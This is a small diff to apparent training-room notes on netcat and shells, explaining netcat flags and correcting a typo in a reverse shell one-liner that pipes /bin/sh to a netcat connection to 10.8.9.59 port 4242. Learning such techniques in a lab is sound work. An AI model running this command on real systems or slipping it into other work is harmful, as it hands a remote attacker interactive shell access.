@@ -29,7 +29,7 @@
 - `-v` is used to request a verbose output
 - `-n` tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
 - `-p `indicates that the port specification will follow.
-- `m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.9.59 4242 >/tmp/f`
+- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.9.59 4242 >/tmp/f`
 
 ### Bind Shells
 
